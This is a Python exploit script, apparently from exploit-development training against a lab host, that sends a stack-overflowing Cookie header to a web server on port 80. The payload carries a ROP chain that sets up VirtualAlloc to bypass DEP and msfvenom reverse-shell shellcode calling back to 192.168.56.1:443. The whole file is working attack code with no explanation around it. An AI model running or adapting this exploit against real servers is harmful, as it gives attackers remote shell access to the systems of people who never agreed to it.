import socket
from struct import pack

try:
    server = "192.168.56.108"
    port = 80

    va = b"A"  # for stack alignment
    va += pack("<I", 0x42424242)  # VA
    va += pack("<I", 0x43434343)  # Return Address
    va += pack("<I", 0x44444444)  # lpAddress
    va += pack("<I", 0x45454545)  # dwSize
    va += pack("<I", 0x46464646)  # flAllocationType
    va += pack("<I", 0x47474747)  # flProtect

    # msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.1 LPORT=443 -f python -v shellcode -b "\x00\x3b"
    shellcode = b"\xbd\xb5\x09\x14\xfb\xda\xc9\xd9\x74\x24\xf4"
    shellcode += b"\x5a\x33\xc9\xb1\x52\x31\x6a\x12\x83\xea\xfc"
    shellcode += b"\x03\xdf\x07\xf6\x0e\xe3\xf0\x74\xf0\x1b\x01"
    shellcode += b"\x19\x78\xfe\x30\x19\x1e\x8b\x63\xa9\x54\xd9"
    shellcode += b"\x8f\x42\x38\xc9\x04\x26\x95\xfe\xad\x8d\xc3"
    shellcode += b"\x31\x2d\xbd\x30\x50\xad\xbc\x64\xb2\x8c\x0e"
    shellcode += b"\x79\xb3\xc9\x73\x70\xe1\x82\xf8\x27\x15\xa6"
    shellcode += b"\xb5\xfb\x9e\xf4\x58\x7c\x43\x4c\x5a\xad\xd2"
    shellcode += b"\xc6\x05\x6d\xd5\x0b\x3e\x24\xcd\x48\x7b\xfe"
    shellcode += b"\x66\xba\xf7\x01\xae\xf2\xf8\xae\x8f\x3a\x0b"
    shellcode += b"\xae\xc8\xfd\xf4\xc5\x20\xfe\x89\xdd\xf7\x7c"
    shellcode += b"\x56\x6b\xe3\x27\x1d\xcb\xcf\xd6\xf2\x8a\x84"
    shellcode += b"\xd5\xbf\xd9\xc2\xf9\x3e\x0d\x79\x05\xca\xb0"
    shellcode += b"\xad\x8f\x88\x96\x69\xcb\x4b\xb6\x28\xb1\x3a"
    shellcode += b"\xc7\x2a\x1a\xe2\x6d\x21\xb7\xf7\x1f\x68\xd0"
    shellcode += b"\x34\x12\x92\x20\x53\x25\xe1\x12\xfc\x9d\x6d"
    shellcode += b"\x1f\x75\x38\x6a\x60\xac\xfc\xe4\x9f\x4f\xfd"
    shellcode += b"\x2d\x64\x1b\xad\x45\x4d\x24\x26\x95\x72\xf1"
    shellcode += b"\xe9\xc5\xdc\xaa\x49\xb5\x9c\x1a\x22\xdf\x12"
    shellcode += b"\x44\x52\xe0\xf8\xed\xf9\x1b\x6b\xd2\x56\x1b"
    shellcode += b"\x6a\xba\xa4\x5b\x6d\x81\x20\xbd\x07\xe5\x64"
    shellcode += b"\x16\xb0\x9c\x2c\xec\x21\x60\xfb\x89\x62\xea"
    shellcode += b"\x08\x6e\x2c\x1b\x64\x7c\xd9\xeb\x33\xde\x4c"
    shellcode += b"\xf3\xe9\x76\x12\x66\x76\x86\x5d\x9b\x21\xd1"
    shellcode += b"\x0a\x6d\x38\xb7\xa6\xd4\x92\xa5\x3a\x80\xdd"
    shellcode += b"\x6d\xe1\x71\xe3\x6c\x64\xcd\xc7\x7e\xb0\xce"
    shellcode += b"\x43\x2a\x6c\x99\x1d\x84\xca\x73\xec\x7e\x85"
    shellcode += b"\x28\xa6\x16\x50\x03\x79\x60\x5d\x4e\x0f\x8c"
    shellcode += b"\xec\x27\x56\xb3\xc1\xaf\x5e\xcc\x3f\x50\xa0"
    shellcode += b"\x07\x84\x60\xeb\x05\xad\xe8\xb2\xdc\xef\x74"
    shellcode += b"\x45\x0b\x33\x81\xc6\xb9\xcc\x76\xd6\xc8\xc9"
    shellcode += b"\x33\x50\x21\xa0\x2c\x35\x45\x17\x4c\x1c"

    p = va

    # Filler. First gadget returns to start of ROP chain
    p += b"A" * (0x681 - len(va))

    # ROP Chain

    # Align EBP with VA structure
    p += pack("<I", 0x100193f0)  # pop ebx; ret
    p += pack("<I", 0xfffffdfc)  # -0x204
    p += pack("<I", 0x1001d78a)  # sub ebp, ebx; or dh, dh; ret;

    # Ensure EAX < VirtuaAllocStub addr, so JBE will not trigger
    # SHR ECX helps avoid null bytes in VA IAT address
    # These gadgets will put VA addr into VA structure in EAX
    p += pack("<I", 0x10015442)  # pop eax; ret
    p += pack("<I", 0xffffffff)
    p += pack("<I", 0x100231d1)  # neg eax; ret;
    p += pack("<I", 0x100195f3)  # pop ecx
    p += pack("<I", 0x5662a04)  # VA IAT (0x5662a0)
    p += pack("<I", 0x61c5c479)  # shr ecx, cl;
    p += pack("<I", 0x1001753a)  # mov ecx, dword ptr [ecx]; cmp ecx, eax; jbe
    p += pack("<I", 0x61c05e8c)  # xchg eax, ebp
    p += pack("<I", 0x1001aed0)  # mov dword ptr [eax],ecx

    # Patching return Address
    p += pack("<I", 0x10022199)  # inc eax
    p += pack("<I", 0x10022199)  # inc eax
    p += pack("<I", 0x10022199)  # inc eax
    p += pack("<I", 0x10022199)  # inc eax

    p += pack("<I", 0x100195f3)  # pop ecx
    p += pack("<I", 0xffffffff)

    p += pack("<I", 0x61c05e8c)  # xchg eax, ebp
    p += pack("<I", 0x61c68081)  # inc ecx ; add al, 0x39 ; ret
    p += pack("<I", 0x61c05e8c)  # xchg eax, ebp
    # or ecx, eax; mov [esi+0x0C], ecx; pop edi; or eax ; pop esi
    p += pack("<I", 0x1001cca4)
    p += pack("<I", 0x41414141)  # junk for pop edi
    p += pack("<I", 0x41414141)  # junk for pop esi

    p += pack("<I", 0x10015442)  # pop eax
    p += pack("<I", 0xfffff84c)  # -0x7b4
    p += pack("<I", 0x1001641c)  # sub eax, ecx;
    p += pack("<I", 0x100231d1)  # neg eax; ret;
    p += pack("<I", 0x1001da08)  # mov dword ptr [ecx], eax; ret;

    # Patching lpAddress
    p += pack("<I", 0x61c68081)  # inc ecx ; add al, 0x39 ; ret
    p += pack("<I", 0x61c68081)  # inc ecx ; add al, 0x39 ; ret
    p += pack("<I", 0x61c68081)  # inc ecx ; add al, 0x39 ; ret
    p += pack("<I", 0x61c68081)  # inc ecx ; add al, 0x39 ; ret

    p += pack("<I", 0x10015442)  # pop eax
    p += pack("<I", 0xfffff858)  # -0x7a8
    p += pack("<I", 0x1001641c)  # sub eax, ecx;
    p += pack("<I", 0x100231d1)  # neg eax; ret;
    p += pack("<I", 0x1001da08)  # mov dword ptr [ecx], eax; ret;

    # Patching dwSize
    p += pack("<I", 0x61c68081)  # inc ecx ; add al, 0x39 ; ret
    p += pack("<I", 0x61c68081)  # inc ecx ; add al, 0x39 ; ret
    p += pack("<I", 0x61c68081)  # inc ecx ; add al, 0x39 ; ret
    p += pack("<I", 0x61c68081)  # inc ecx ; add al, 0x39 ; ret

    p += pack("<I", 0x10015442)  # pop eax
    p += pack("<I", 0xffffffff)  #
    p += pack("<I", 0x100231d1)  # neg eax
    p += pack("<I", 0x1001da08)  # mov dword ptr [ecx], eax; ret;

    # Patching flAllocationType
    p += pack("<I", 0x61c68081)  # inc ecx ; add al, 0x39 ; ret
    p += pack("<I", 0x61c68081)  # inc ecx ; add al, 0x39 ; ret
    p += pack("<I", 0x61c68081)  # inc ecx ; add al, 0x39 ; ret
    p += pack("<I", 0x61c68081)  # inc ecx ; add al, 0x39 ; ret

    p += pack("<I", 0x10015442)  # pop eax
    p += pack("<I", 0xffffefff)  # -0x1001
    p += pack("<I", 0x100231d1)  # neg eax
    p += pack("<I", 0x1001a292)  # dec eax; pop edi; pop esi
    p += pack("<I", 0x41414141)  # junk for pop edi
    p += pack("<I", 0x41414141)  # junk for pop esi
    p += pack("<I", 0x1001da08)  # mov dword ptr [ecx], eax

    # Patching flProtect
    p += pack("<I", 0x61c68081)  # inc ecx ; add al, 0x39
    p += pack("<I", 0x61c68081)  # inc ecx ; add al, 0x39
    p += pack("<I", 0x61c68081)  # inc ecx ; add al, 0x39
    p += pack("<I", 0x61c68081)  # inc ecx ; add al, 0x39

    p += pack("<I", 0x10015442)  # pop eax
    p += pack("<I", 0xffffffbf)  # -0x41
    p += pack("<I", 0x100231d1)  # neg eax
    p += pack("<I", 0x1001a292)  # dec eax; pop edi; pop esi
    p += pack("<I", 0x41414141)  # junk for pop edi
    p += pack("<I", 0x41414141)  # junk for pop esi
    p += pack("<I", 0x1001da08)  # mov dword ptr [ecx], eax

    # align VA with ESP & execute

    p += pack("<I", 0x10015442)  # pop eax
    p += pack("<I", 0xffffffec)  # -0x14
    p += pack("<I", 0x100231d1)  # neg eax
    p += pack("<I", 0x1001283e)  # sub eax, ecx; ret;
    p += pack("<I", 0x100231d1)  # neg eax
    p += pack("<I", 0x61c05e59)  # xchg eax, esp

    offsetLen = len(p) + len(shellcode)
    p += b"\x90" * (0xfe7-offsetLen)  # fe7
    p += shellcode

    # FIRST EIP
    p += pack("<I", 0x1002280a)  # EIP - add esp, 0x1004

    buf = b"GET / HTTP/1.1"
    buf += b"Host: 192.168.56.108\r\n"
    buf += b"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36\r\n"
    buf += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n"
    buf += b"Referer: http://192.168.56.108/\r\n"
    buf += b"Accept-Encoding: gzip, deflate\r\n"
    buf += b"Accept-Language: en-GB,en-US;q=0.9,en;q=0.8\r\n"
    buf += b"Cookie: SESSIONID=19653; UserID="+p+b"; PassWD="
    buf += b"Connection: close\r\n"
    buf += b"\r\n"

    print("Sending evil buffer...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(buf)
    print(s.recv(1024).decode())
    s.close()
    print("\nDone!")

except socket.error:
    print("Could not connect!")
